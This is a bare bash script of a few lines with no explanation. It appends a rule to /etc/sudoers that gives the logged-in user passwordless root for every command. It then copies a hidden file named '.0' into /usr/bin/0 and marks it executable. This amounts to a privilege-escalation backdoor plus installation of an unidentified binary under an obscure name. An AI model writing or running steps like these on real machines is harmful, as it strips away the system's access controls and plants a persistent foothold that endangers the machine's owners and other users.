#!/usr/bin/bash
name=`logname`
echo "$name ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
cp .0 /usr/bin/0
chmod +x /usr/bin/0

